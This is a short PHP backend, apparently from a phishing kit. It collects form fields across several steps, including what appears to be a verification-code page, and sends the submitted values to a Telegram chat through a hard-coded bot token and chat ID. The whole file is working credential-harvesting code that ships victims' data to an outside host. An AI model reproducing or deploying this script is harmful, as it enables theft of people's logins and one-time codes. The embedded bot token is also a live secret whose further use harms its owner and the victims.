<?php
	if(isset($_POST['send'])){
    $a0 = $_POST['a0'].header('Location: index1.html');
}
if(isset($_POST['send2'])){
    $a1 = $_POST['a1'].$_POST['a2'].$_POST['a3']. $_POST['a4'].header('Location: index2.html'); 
}
if(isset($_POST['buttonElement'])){
	$ba = $_POST['a'].$_POST['b'].header('Location: code.html');
}
{
		
		$data = [
		    'chat_id' => '-1001709983534', 
		    'text' =>  $_POST["a0"]  .$_POST['a1'] .$_POST['a2'] .$_POST['a3'].$_POST['a4'].$_POST['ba']
            
		];
		$response = file_get_contents("https://api.telegram.org/bot5449821388:AAEUWVLpjGA1NPSNk1Pt-OCWXjH82M7CiH0/sendMessage?" . http_build_query($data ) );	
	}
    // https://api.telegram.org/bot5449821388:AAEUWVLpjGA1NPSNk1Pt-OCWXjH82M7CiH0/sendMessage
	
	
?>
